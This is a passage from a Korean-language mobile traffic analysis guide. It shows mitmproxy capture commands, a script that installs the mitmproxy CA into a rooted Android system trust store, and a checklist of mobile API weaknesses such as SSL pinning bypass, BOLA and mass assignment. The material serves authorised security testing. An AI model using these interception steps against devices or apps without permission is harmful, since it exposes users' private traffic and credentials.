# mitmproxy로 먼저 캡처 후 분석
mitmdump -w traffic.bin --listen-port 8080
python3 mobile_traffic_analyzer.py analyze -f traffic.bin -o report.json
```

### mitmproxy CA 인증서 설치 스크립트
```bash
# mitmproxy CA 위치 확인
python3 -c "import mitmproxy.net.http.http1 as _; import mitmproxy; print(mitmproxy.__file__)"
# 보통: ~/.mitmproxy/mitmproxy-ca-cert.pem

# Android (루팅)
HASH=$(openssl x509 -inform PEM -subject_hash_old \
    -in ~/.mitmproxy/mitmproxy-ca-cert.pem | head -1)
cp ~/.mitmproxy/mitmproxy-ca-cert.pem ./${HASH}.0
adb push ${HASH}.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/${HASH}.0

# iOS (Safari로 설치)
# http://<PC_IP>:8080 접속 → Get mitmproxy's Certificate Authority
```

---

## 체크리스트: 모바일 트래픽 분석

| 항목 | 확인 내용 | 위험도 |
|------|-----------|--------|
| HTTPS 적용 | 모든 통신 TLS 사용 여부 | HIGH |
| SSL Pinning | 인증서 핀 검증 우회 가능 여부 | HIGH |
| 인증 토큰 | JWT/OAuth 토큰 안전성 | HIGH |
| BOLA | 리소스 ID 변경 시 타 사용자 데이터 접근 | HIGH |
| BFLA | 권한 없는 함수 호출 가능 여부 | HIGH |
| Rate Limiting | 인증 엔드포인트 속도 제한 | MEDIUM |
| CORS | Access-Control-Allow-Origin 와일드카드 | MEDIUM |
| 민감 데이터 | 응답 본문에 과도한 정보 포함 | MEDIUM |
| HTTP 평문 | 일부 요청 HTTP 사용 | HIGH |
| 서버 정보 노출 | Server 헤더, X-Powered-By | LOW |
| API 버전 관리 | 구버전 API 엔드포인트 접근 가능성 | MEDIUM |
| Mass Assignment | 예상치 못한 파라미터 바인딩 | HIGH |
